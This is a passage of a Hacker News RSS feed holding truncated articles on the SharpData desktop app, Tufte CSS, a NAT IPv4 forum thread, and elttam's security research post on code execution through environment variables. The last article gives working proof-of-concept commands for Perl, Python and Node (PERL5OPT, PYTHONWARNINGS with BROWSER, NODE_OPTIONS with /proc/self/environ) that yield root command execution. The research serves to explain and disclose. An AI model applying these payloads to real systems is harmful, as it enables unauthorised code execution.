<p><a href="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-excel.png" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-excel.png" alt=""></a></p>
<p>This works seamlessly as it's able to "by-pass" the browser download where the query is performed by the back-end .NET Core Server who streams the response directly to the Users <strong>Downloads</strong> folder and launches it in Excel as soon as it's finished.</p>
<h3>
Launching SharpData</h3>
<p>To run SharpData in a .NET Core Desktop App you'll need latest <code>app</code> dotnet tool:</p>
<pre><code>$ dotnet tool update -g app
</code></pre>
<blockquote>
<p>If on macOS/Linux you can use the <a href="https://docs.servicestack.net/dotnet-tool" rel="nofollow">x dotnet tool</a> instead to view SharpData in your default browser</p>
</blockquote>
<h3>
Configure RDBMS from command-line</h3>
<p>You can override which database to connect to by specifying it on the command line, e.g. here's an example of connecting to <a href="https://techstacks.io/" rel="nofollow">https://techstacks.io</a> RDBMS:</p>
<pre><code>$ app open sharpdata -db postgres -db.connection $TECHSTACKS_DB
</code></pre>
<p>Which will open SharpData listing all of TechStack's RDBMS tables. If you have a lot of tables the <strong>Sidebar filter</strong> provides a quick way to
find the table you want, e.g:</p>
<p><a href="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-technology.png" target="_blank" rel="nofollow"><img src="https://raw.githubusercontent.com/ServiceStack/docs/master/docs/images/release-notes/v5.9/sharpdata-technology.png" alt=""></a></p>
<h3>
app URL Schemes</h3>
<p>What can be done with the <code>open</code> command on the command-line can also be done from a <strong>custom URL Scheme</strong>, a feature that opens up a myriad of new
possibilities as <code>app</code> can open <a href="https://sharpscript.net/docs/gist-desktop-apps" rel="nofollow">Gist Desktop Apps</a> from Gists or in public &amp; private GitHub repositories,
where it's able to download and launch Apps on the fly with custom arguments - allowing a single URL to run a <strong>never installed</strong> Desktop App stored in a
Gist &amp; pass it custom params to enable <strong>deep linking</strong>.</p>
<p>With this organizations could maintain a dashboard of links to its different Desktop Apps that anyone can access, especially useful as the
<strong>only software</strong> that's needed to run any <a href="https://sharpscript.net/docs/sharp-apps" rel="nofollow">Sharp Apps</a> is the <code>app</code> dotnet tool which thanks to all
ServiceStack .dll's &amp; dependencies being bundled with the tool, (including Vue/React/Bootstrap fontawesome and Material SVG Icon assets),
the only files that need to be published are the App's specific resources, which is how Apps like <strong>SharpData</strong> can be compressed in a
<strong>20kb .zip</strong> - a tiny payload that's viable to download the latest app each on each run, removing the pain &amp; friction to distribute updates as
everyone's already running the latest version every time it's run.</p>
<p>Should you need to (e.g. large Sharp App or github.com is down) you can run your previously locally cached App using <code>run</code>:</p>
<pre><code>$ app run sharpdata
</code></pre>
<p>With Custom URL Schemes everyone with <code>app</code> installed can view any database they have network access to from specifying the db type and connection string in the URL:</p>
<pre><code>app://sharpdata?db=postgres&amp;db.connection={CONNECTION_STRING}
</code></pre>
<blockquote>
<p>CONNECTION_STRING needs to be URL Encoded, e.g. with JS's <code>encodeURIComponent()</code></p>
</blockquote>
<p>or by specifying an Environment variable containing the connection string:</p>
<pre><code>app://sharpdata?db=postgres&amp;db.connection=$TECHSTACKS_DB
</code></pre>
<h3>
Mix in Gists</h3>
<p>In…</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sharpscript.net/sharp-apps/sharpdata">https://sharpscript.net/sharp-apps/sharpdata</a></em></p>]]>
            </description>
            <link>https://sharpscript.net/sharp-apps/sharpdata</link>
            <guid isPermaLink="false">hacker-news-small-sites-23829512</guid>
            <pubDate>Tue, 14 Jul 2020 07:46:39 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tufte CSS]]>
            </title>
            <description>
<![CDATA[
Score 58 | Comments 9 (<a href="https://news.ycombinator.com/item?id=23828196">thread link</a>) | @mmastrac
<br/>
July 13, 2020 | https://edwardtufte.github.io/tufte-css/ | <a href="https://web.archive.org/web/*/https://edwardtufte.github.io/tufte-css/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
      
      <p>Dave Liepmann</p>
      <section>
        <p>Tufte CSS provides tools to style web articles using the ideas demonstrated by Edward Tufte’s books and handouts. Tufte’s style is known for its simplicity, extensive use of sidenotes, tight integration of graphics with text, and carefully chosen typography.</p>
        <p>Tufte CSS was created by <a href="http://www.daveliepmann.com/">Dave Liepmann</a> and is now an Edward Tufte project. The original idea was cribbed from <a href="https://tufte-latex.github.io/tufte-latex/">Tufte-<span>L<span>a</span>T<span>e</span>X</span></a> and <a href="http://rmarkdown.rstudio.com/tufte_handout_format.html">R Markdown’s Tufte Handout format</a>. We give hearty thanks to all the people who have contributed to those projects.</p>
        <p>If you see anything that Tufte CSS could improve, we welcome your contribution in the form of an issue or pull request on the GitHub project: <a href="https://github.com/edwardtufte/tufte-css">tufte-css</a>. Please note the <a href="https://github.com/edwardtufte/tufte-css#contributing">contribution guidelines</a>.</p>
        <p>Finally, a reminder about the goal of this project. The web is not print. Webpages are not books. Therefore, the goal of Tufte CSS is not to say “websites should look like this interpretation of Tufte’s books” but rather “here are some techniques Tufte developed that we’ve found useful in print; maybe you can find a way to make them useful on the web”. Tufte CSS is merely a sketch of one way to implement this particular set of ideas. It should be a starting point, not a design goal, because any project should present their information as best suits their particular circumstances.</p>
      </section>

      <section>
        <h2 id="getting-started">Getting Started</h2>
        <p>To use Tufte CSS, copy <code>tufte.css</code> and the <code>et-book</code> directory of font files to your project directory, then add the following to your HTML document’s <code>head</code> block:</p>

        <pre><code>&lt;link rel="stylesheet" href="tufte.css"/&gt;</code></pre>

        <p>Now you just have to use the provided CSS rules, and the Tufte CSS conventions described in this document. For best results, View Source and Inspect Element frequently.</p>
      </section>

      <section>
        <h2 id="fundamentals">Fundamentals</h2>
        <h3 id="fundamentals--sections-and-headers">Sections and Headings</h3>
        <p>Organize your document with an <code>article</code> element inside your <code>body</code> tag. Inside that, use <code>section</code> tags around each logical grouping of text and headings.</p>
        <p>Tufte CSS uses <code>h1</code> for the document title, <code>p</code> with class <code>subtitle</code> for the document subtitle, <code>h2</code> for section headings, and <code>h3</code> for low-level headings. More specific headings are not supported. If you feel the urge to reach for a heading of level 4 or greater, consider redesigning your document:</p>
        <blockquote cite="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000hB">
          <p>[It is] notable that the Feynman lectures (3 volumes) write about all of physics in 1800 pages, using only 2 levels of hierarchical headings: chapters and A-level heads in the text. It also uses the methodology of <em>sentences</em> which then cumulate sequentially into <em>paragraphs</em>, rather than the grunts of bullet points. Undergraduate Caltech physics is very complicated material, but it didn’t require an elaborate hierarchy to organize.</p>
          
        </blockquote>
        <p>As a bonus, this excerpt regarding the use of headings provides an example of block quotes. In Tufte CSS they are just lightly styled, semantically correct HTML using <code>blockquote</code> and <code>footer</code> elements. See page 20 of <a href="https://www.edwardtufte.com/tufte/books_vdqi">The Visual Display of Quantitative Information</a> for an example in print.</p>
        <p><span>In his later books<label for="sn-in-his-later-books"></label></span><span><a href="http://www.edwardtufte.com/tufte/books_be"><em>Beautiful Evidence</em></a></span>, Tufte starts each section with a bit of vertical space, a non-indented paragraph, and the first few words of the sentence set in small caps. For this we use a span with the class <code>newthought</code>, as demonstrated at the beginning of this paragraph. Vertical spacing is accomplished separately through <code>&lt;section&gt;</code> tags. Be consistent: though we do so in this paragraph for the purpose of demonstration, do not alternate use of header elements and the <code>newthought</code> technique. Pick one approach and stick to it.</p>

        <h3 id="fundamentals--text">Text</h3>
        <p>Although paper handouts obviously have a pure white background, the web is better served by the use of slightly off-white and off-black colors. Tufte CSS uses <code>#fffff8</code> and <code>#111111</code> because they are nearly indistinguishable from their ‘pure’ cousins, but dial down the harsh contrast. We stick to the greyscale for text, reserving color for specific, careful use in figures and images.</p>
        <p>In print, Tufte has used the proprietary Monotype Bembo<label for="sn-proprietary-monotype-bembo"></label><span>See Tufte’s comment in the <a href="http://www.edwardtufte.com/bboard/q-and-a-fetch-msg?msg_id=0000Vt">Tufte book fonts</a> thread.</span> font. A similar effect is achieved in digital formats with the now open-source <a href="https://github.com/edwardtufte/et-book">ETBook</a>, which Tufte CSS supplies with a <code>@font-face</code> reference to a .ttf file. In case ETBook somehow doesn’t work, Tufte CSS shifts gracefully to other serif fonts like Palatino and Georgia.</p>
        <p>Also notice how Tufte CSS includes separate font files for bold (strong) and italic (emphasis), instead of relying on the browser to mechanically transform the text. This is typographic best practice.</p>
        <p>If you prefer sans-serifs, use the <code>sans</code> class. It relies on Gill Sans, Tufte’s sans-serif font of choice.</p>
        <p>Links in Tufte CSS match the body text in color and do not change on mouseover or when clicked. Here is a <a href="#">dummy example</a> that goes nowhere. These links are underlined, since this is the most widely recognized indicator of clickable text. <label for="mn-blue-links">⊕</label><span>Blue text, while also a widely recognizable clickable-text indicator, is crass and distracting. Luckily, it is also rendered unnecessary by the use of underlining.</span> However, because most browsers’ default underlining does not clear descenders and is so thick and distracting, the underline effect is instead achieved using CSS trickery involving background gradients instead of standard <code>text-decoration</code>. Credit goes to Adam Schwartz for that technique.</p>
        <p>As always, these design choices are merely one approach that Tufte CSS provides by default. Other approaches can also be made to work. The goal is to make sentences readable without interference from links, as well as to make links immediately identifiable even by casual web users.</p>
      </section>

      <section>
        <h2 id="epigraphs">Epigraphs</h2>
        <div>
          <blockquote>
            <p>The English language . . . becomes ugly and inaccurate because our thoughts are foolish, but the slovenliness of our language makes it easier for us to have foolish thoughts.</p>
            
          </blockquote>
          <blockquote>
            <p>For a successful technology, reality must take precedence over public relations, for Nature cannot be fooled.</p>
            
          </blockquote>
          <blockquote>I do not paint things, I paint only the differences between things.</blockquote>
        </div>
        <p>If you’d like to introduce your page or a section of your page with some quotes, use epigraphs. Modeled after chapter epigraphs in Tufte’s books (particularly <em>Beautiful Evidence</em>), these are <code>blockquote</code> elements with a bit of specialized styling. Quoted text is italicized. The source goes in a <code>footer</code> element inside the <code>blockquote</code>. We have provided three examples in the epigraph of this section, demonstrating shorter and longer quotes, with and without a paragraph tag, and showing how multiple quotes within an epigraph fit together with the use of a wrapper class.</p>
      </section>

      <section>
        <h2 id="sidenotes">Sidenotes: Footnotes and Marginal Notes</h2>
        <p>One of the most distinctive features of Tufte’s style is his extensive use of sidenotes.<label for="sn-extensive-use-of-sidenotes"></label><span>This is a sidenote.</span> Sidenotes are like footnotes, except they don’t force the reader to jump their eye to the bottom of the page, but instead display off to the side in the margin. Perhaps you have noticed their use in this document already. You are very astute.</p>
        <p>Sidenotes are a great example of the web not being like print. On sufficiently large viewports, Tufte CSS uses the margin for sidenotes, margin notes, and small figures. On smaller viewports, elements that would go in the margin are hidden until the user toggles them into view. The goal is to present related but not necessary information such as asides or citations <em>as close as possible</em> to the text that references them. At the same time, this secondary information should stay out of the way of the eye, not interfering with the progression of ideas in the main text.</p>
        <p>Sidenotes consist of two elements: a superscript reference number that goes inline with the text, and a sidenote with content. To add the former, just put a label and dummy checkbox into the text where you want the reference to go, like so:</p>
        <pre><code>&lt;label for="sn-demo"
       class="margin-toggle sidenote-number"&gt;
&lt;/label&gt;
&lt;input type="checkbox"
       id="sn-demo"
       class="margin-toggle"/&gt;</code></pre>
        <p>You must manually assign a reference <code>id</code> to each side or margin note, replacing “sn-demo” in the <code>for</code> and the <code>id</code> attribute values with an appropriate descriptor. It is useful to use prefixes like <code>sn-</code> for sidenotes and <code>mn-</code> for margin notes.</p>
        <p>Immediately adjacent to that sidenote reference in the main text goes the sidenote content itself, in a <code>span</code> with class <code>sidenote</code>. This tag is also inserted directly in the middle of the body text, but is either pushed into the margin or hidden by default. Make sure to position your sidenotes correctly by keeping the sidenote-number label close to the sidenote itself.</p>
        <p>If you want a sidenote without footnote-style numberings, then you want a margin note.
          <label for="mn-demo">⊕</label>
          
          <span>
            This is a margin note. Notice there isn’t a number preceding the note.
          </span> On large screens, a margin note is just a sidenote that omits the reference number. This lessens the distracting effect taking away from the flow of the main text, but can increase the cognitive load of matching a margin note to its referent text. However, on small screens, a margin note is like a sidenote except its viewability-toggle is a symbol rather than a reference number. This document currently uses the symbol ⊕ (<code>&amp;#8853;</code>), but it’s up to you.</p>
        <p>Margin notes are created just like sidenotes, but with the <code>marginnote</code> class for the content and the <code>margin-toggle</code> class for the label and dummy checkbox. For instance, here is the code for the margin note used in the previous paragraph:</p>
        <pre><code>&lt;label for="mn-demo" class="margin-toggle"&gt;&amp;#8853;&lt;/label&gt;
&lt;input type="checkbox" id="mn-demo" class="margin-toggle"/&gt;
&lt;span class="marginnote"&gt;
  This is a margin note. Notice there isn’t a number preceding the note.
&lt;/span&gt;</code></pre>
        </section></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://edwardtufte.github.io/tufte-css/">https://edwardtufte.github.io/tufte-css/</a></em></p>]]>
            </description>
            <link>https://edwardtufte.github.io/tufte-css/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23828196</guid>
            <pubDate>Tue, 14 Jul 2020 03:29:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Strange public IPv4 address assigned behind NAT (2019)]]>
            </title>
            <description>
<![CDATA[
Score 84 | Comments 86 (<a href="https://news.ycombinator.com/item?id=23827521">thread link</a>) | @rohan1024
<br/>
July 13, 2020 | https://broadbandforum.co/t/190267/ | <a href="https://web.archive.org/web/*/https://broadbandforum.co/t/190267/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to retrieve article]]>
            </description>
            <link>https://broadbandforum.co/t/190267/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23827521</guid>
            <pubDate>Tue, 14 Jul 2020 01:12:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking with environment variables]]>
            </title>
            <description>
<![CDATA[
Score 221 | Comments 63 (<a href="https://news.ycombinator.com/item?id=23827486">thread link</a>) | @pentestercrab
<br/>
July 13, 2020 | https://www.elttam.com/blog/env/ | <a href="https://web.archive.org/web/*/https://www.elttam.com/blog/env/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                        

<p>On a recent project we gained the ability to specify environment variables but not the process that was executed.
We were also unable to control the contents of a file on disk, and bruteforcing process identifiers (PIDs) and file descriptors found no interesting results, eliminating <a href="https://www.elttam.com/blog/goahead/">remote LD_PRELOAD exploitation</a>.
Fortunately, a scripting language interpreter was executed which enabled us to execute arbitrary commands by specifying particular environment variables.
This blog post discusses how arbitrary commands can be executed by a range of scripting language interpreters when supplied with malicious environment variables.</p>



<p>A quick read of the <code>ENVIRONMENT</code> section of the <code>perlrun(1)</code> man page reveals plenty of environment variables worth investigating.
The <code>PERL5OPT</code> environment variable allows specifying command-line options, but is restricted to only accepting the options <code>CDIMTUWdmtw</code>.
This unfortunately means that <code>-e</code>, which allows supplying perl code to run, is out.</p>

<p>All is not lost though, as demonstrated in the <a href="https://github.com/HackerFantastic/exploits/blob/master/cve-2016-1531.sh">exploit</a> for CVE-2016-1531 by <a href="https://twitter.com/hackerfantastic">Hacker Fantastic</a>.
The exploit writes a malicious perl module to <code>/tmp/root.pm</code> and supplies the environment variables <code>PERL5OPT=-Mroot</code> and <code>PERL5LIB=/tmp</code> to achieve arbitrary code execution.
However this was an exploit for a local privilege escalation vulnerability and a generic technique should ideally not require access to the file system. Looking at <a href="https://twitter.com/bl4sty">blasty</a>’s <a href="https://haxx.in/blasty-vs-exim.sh">exploit</a> for the same CVE, the exploit did not require creating a file and used the environment variables <code>PERL5OPT=-d</code> and <code>PERL5DB=system("sh");exit;</code>.
The same environment variables were also used to <a href="https://old.reddit.com/r/netsec/comments/1dm8fv/hack_this_website_and_win_bitcoins_the_first/c9tm6j4/">solve a CTF challenge</a> in 2013.</p>

<p>One final nicety of a generic technique would be to use a single environment variable instead of two.
<a href="https://twitter.com/justinsteven">@justinsteven</a> found this was possible by leveraging <code>PERL5OPT=-M</code>.
While either <code>-m</code> or <code>-M</code> can be used to load a perl module, the <code>-M</code> option allows adding extra code after the module name.</p>

<h2 id="proof-of-concept">Proof of Concept</h2>

<figure>
  <figcaption>Figure-0: arbitrary code execution achieved using an environment variable against perl running an empty script (/dev/null)</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>--env</span> <span>'PERL5OPT=-Mbase;print(`id`)'</span> perl:5.30.2 perl /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>



<p>Reading the <code>ENVIRONMENT VARIABLES</code> section of the <code>python(1)</code> man page, <code>PYTHONSTARTUP</code> initially appears like it may be a piece of a straightforward solution.
It allows specifying a path to a Python script that will be executed prior to displaying the prompt in interactive mode.
The interactive mode requirement didn’t seem like it would be an issue as the <code>PYTHONINSPECT</code> environment variable can be used to enter interactive mode, the same as specifying <code>-i</code> on the command line.
However, the documentation for the <code>-i</code> option explains that <code>PYTHONSTARTUP</code> will not be used when python is started with a script to execute.
This means that <code>PYTHONSTARTUP</code> and <code>PYTHONINSPECT</code> cannot be combined and <code>PYTHONSTARTUP</code> only has an effect when the python REPL is immediately launched.
This ultimately means that <code>PYTHONSTARTUP</code> is not viable as it has no effect when executing a regular Python script.</p>

<p>Other environment variables which looked promising were <code>PYTHONHOME</code> and <code>PYTHONPATH</code>. Both of these will let you gain arbitrary code execution but require you to also be able to create directories and files on the filesystem. It may be possible to loosen those requirements through the use of the proc filesystem and/or ZIP files.</p>

<p>The majority of the remaining environment variables are simply checked if they contain a non-empty string, and if so, toggle a generally benign setting. One of the rare exceptions to this is <code>PYTHONWARNINGS</code>.</p>

<h2 id="making-progress-with-pythonwarnings">Making progress with PYTHONWARNINGS</h2>
<p>The documentation for <code>PYTHONWARNINGS</code> states <code>it is equivalent to specifying the -W option</code>. The <code>-W</code> option is used for warning control to specify which warnings and how often they are printed. The full form of argument is <code>action:message:category:module:line</code>. While warning control didn’t seem like a promising lead, that quickly changed after checking the implementation.</p>

<figure>
  <figcaption>Figure-1: Python-3.8.2/Lib/warnings.py</figcaption>

<figure><pre><code data-lang="python"><span>[...]</span>
<span>def</span> <span>_getcategory</span><span>(</span><span>category</span><span>):</span>
    <span>if</span> <span>not</span> <span>category</span><span>:</span>
        <span>return</span> <span>Warning</span>
    <span>if</span> <span>'.'</span> <span>not</span> <span>in</span> <span>category</span><span>:</span>
        <span>import</span> <span>builtins</span> <span>as</span> <span>m</span>
        <span>klass</span> <span>=</span> <span>category</span>
    <span>else</span><span>:</span>
        <span>module</span><span>,</span> <span>_</span><span>,</span> <span>klass</span> <span>=</span> <span>category</span><span>.</span><span>rpartition</span><span>(</span><span>'.'</span><span>)</span>
        <span>try</span><span>:</span>
            <span>m</span> <span>=</span> <span>__import__</span><span>(</span><span>module</span><span>,</span> <span>None</span><span>,</span> <span>None</span><span>,</span> <span>[</span><span>klass</span><span>])</span>
        <span>except</span> <span>ImportError</span><span>:</span>
            <span>raise</span> <span>_OptionError</span><span>(</span><span>"invalid module name: %r"</span> <span>%</span> <span>(</span><span>module</span><span>,))</span> <span>from</span> <span>None</span>
<span>[...]</span></code></pre></figure>

</figure>

<p>The above code shows that as long as our specified category contains a dot, we can trigger the import an arbitrary Python module.</p>

<p>The next problem is that the vast majority of modules from Python’s standard library run very little code when imported. They tend to just define classes to be used later, and even when they provide code to run, the code is typically <a href="https://docs.python.org/3/library/__main__.html">guarded with a check of the <code>__main__</code> variable</a> (to detect if the file has been imported or run directly).</p>

<p>An unexpected exception to this is the <a href="https://xkcd.com/353/">antigravity module</a>. The Python developers included an <a href="https://en.wikipedia.org/wiki/Easter_egg_(media)">easter egg</a> in <a href="https://github.com/python/cpython/commit/206e3074d34aeb5a4d0c1e24d970b6569f7ad702">2008</a> which can be triggered by running <code>import antigravity</code>. This import will immediately open your browser to the xkcd comic that joked that <code>import antigravity</code> in Python would grant you the ability to fly.</p>

<p>As for how the <code>antigravity</code> module opens your browser, it uses another module from the standard library called <code>webbrowser</code>. This module checks your PATH for a large variety of browsers, including mosaic, opera, skipstone, konqueror, chrome, chromium, firefox, links, elinks and lynx. It also accepts an environment variable <code>BROWSER</code> that lets you specify which process should be executed. It is not possible to supply arguments to the process in the environment variable and the xkcd comic URL is the one hard-coded argument for the command.</p>

<p>The ability to turn this into arbitrary code execution depends on what other executables are available on the system.</p>

<h2 id="leveraging-perl-for-arbitrary-code-execution">Leveraging Perl for Arbitrary Code Execution</h2>

<p>One approach is to leverage Perl which is commonly installed on systems and is even available in the standard Python docker image. However, the <code>perl</code> binary cannot itself be used. This is because the first and only argument is the xkcd comic URL. The comic URL argument will cause an error and the process to exit without the <code>PERL5OPT</code> environment variable being used.</p>

<figure>
  <figcaption>Figure-2: PERL5OPT having no effect when a URL is passed to perl</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perl https://xkcd.com/353/
<span>Can't open perl script "https://xkcd.com/353/": No such file or directory</span></code></pre></figure>

</figure>

<p>Fortunately, when Perl is available it also common to have the default Perl scripts available, such as perldoc and perlthanks. These scripts will also error and exit with an invalid argument, but the error in this case happens later than the processing of the <code>PERL5OPT</code> environment variable. This means you can leverage the Perl environment variable payload detailed earlier in this blog post.</p>

<figure>
  <figcaption>Figure-3: PERL5OPT working as intended with perldoc and perlthanks</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perldoc https://xkcd.com/353/
<span>uid=0(root) gid=0(root) groups=0(root)
</span><span>$</span><span> </span>run <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit'</span> perl:5.30.2 perlthanks https://xkcd.com/353/
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>

<h2 id="proof-of-concept-1">Proof of Concept</h2>

<figure>
  <figcaption>Figure-4: arbitrary code execution achieved using multiple environment variables against Python 2 and Python 3</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'PYTHONWARNINGS=all:0:antigravity.x:0:0'</span> <span>-e</span> <span>'BROWSER=perlthanks'</span> <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit;'</span> python:2.7.18 python /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'

</span><span>$</span><span> </span>docker run <span>-e</span> <span>'PYTHONWARNINGS=all:0:antigravity.x:0:0'</span> <span>-e</span> <span>'BROWSER=perlthanks'</span> <span>-e</span> <span>'PERL5OPT=-Mbase;print(`id`);exit;'</span> python:3.8.2 python /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)
Invalid -W option ignored: unknown warning category: 'antigravity.x'</span></code></pre></figure>

</figure>



<p>A <a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">blog post</a> by <a href="https://twitter.com/securitymb">Michał Bentkowski</a> provided a payload for exploiting Kibana (CVE-2019-7609). A prototype pollution vulnerability was used to set arbitrary environment variables which resulted in arbitrary command execution. Michał’s payload used the <code>NODE_OPTIONS</code> environment variable and the <a href="https://en.wikipedia.org/wiki/Procfs">proc filesystem</a>, specifically <code>/proc/self/environ</code>.</p>

<p>Although Michał’s technique was creative and worked perfectly for their vulnerability, the technique is not always guaranteed to work and has some constraints that would be nice to remove.</p>

<p>The first constraint is that it using <code>/proc/self/environ</code> is only viable if the contents can be made to be syntactically valid JavaScript. This requires being able to create an environment variable and have it appear first in the contents of <code>/proc/self/environ</code>, or knowing/bruteforcing the environment variable’s name that will appear first and overwriting it’s value.</p>

<p>Another constraint, as the first environment variable’s value finishes with a single line comment (<code>//</code>). Therefore, any newline character in other environment variables will likely cause a syntax error and prevent the payload from executing. The use of multi-line comments (<code>/*</code>) will not fix this issue as they must be closed to be syntactically valid. Therefore, in the rare case that an environment variable contains a newline character, it is required to know/bruteforce the environment variable’s name and overwrite it’s value to a new value that does not contain a newline.</p>

<p>Removing these contraints is an exercise left for the reader.</p>

<h2 id="proof-of-concept-2">Proof of Concept</h2>

<figure>
  <figcaption>Figure-5: achieving arbitrary code execution with environment variables against NodeJS by Michał Bentkowski</figcaption>

<figure><pre><code data-lang="console"><span>$</span><span> </span>docker run <span>-e</span> <span>'NODE_VERSION=console.log(require("child_process").execSync("id").toString());//'</span> <span>-e</span> <span>'NODE_OPTIONS=--require /proc/self/environ'</span> node:14.2.0 node /dev/null
<span>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></figure>

</figure>



<p>If you run <code>ltrace -e getenv php /dev/null</code> you will find PHP uses the <code>PHPRC</code> environment variable.
The environment variable is used …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.elttam.com/blog/env/">https://www.elttam.com/blog/env/</a></em></p>]]>
            </description>
            <link>https://www.elttam.com/blog/env/</link>
            <guid isPermaLink="false">hacker-news-small-sites-23827486</guid>
            <pubDate>Tue, 14 Jul 2020 01:07:25 GMT</pubDate>
        </item>
    </channel>
</rss>
